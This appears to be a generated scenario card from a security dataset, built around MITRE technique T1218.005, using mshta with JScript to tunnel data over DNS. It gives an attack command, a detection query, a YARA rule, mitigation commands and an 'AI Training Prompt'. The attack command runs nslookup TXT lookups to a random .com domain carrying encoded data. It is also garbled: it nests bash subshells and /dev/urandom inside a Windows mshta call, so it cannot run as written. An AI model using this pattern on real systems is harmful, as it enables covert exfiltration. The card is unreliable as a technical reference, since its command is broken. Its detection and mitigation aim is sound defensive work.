---
type: campaign
scenario_id: 474
tactic: Defense Evasion
technique: "T1218.005: Mshta"
technique_id: T1218.005
tags: [campaign, lotl, defense_evasion]
---

# Using mshta with JScript for DNS tunneling.

## Threat Description
Using mshta with JScript for DNS tunneling.

## Attack Command
```
mshta jscript:Execute("new ActiveXObject('WScript.Shell').Run('nslookup -type=TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)');close()")
```

## Detection Logic
Monitor mshta JScript: `wmic process where name='mshta.exe' get commandline | findstr jscript`; YARA rule: `rule MshtaJsDnsTunnel { strings: $a = /mshta.*jscript.*nslookup/ nocase; condition: $a }`.

## Mitigation
Restrict mshta: `icacls %windir%\System32\mshta.exe /deny Everyone:RX`; Block DNS queries: `netsh advfirewall firewall add rule name='Block mshta DNS' dir=out program='%windir%\System32\mshta.exe' action=block`.

## AI Training Prompt
Train AI to detect mshta JScript-based DNS tunneling by analyzing nslookup TXT queries, mshta command-line arguments, and DNS traffic patterns; suggest DNS restrictions.

## References
- MITRE ATT&CK T1218.005: https://attack.mitre.org/techniques/T1218/005/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
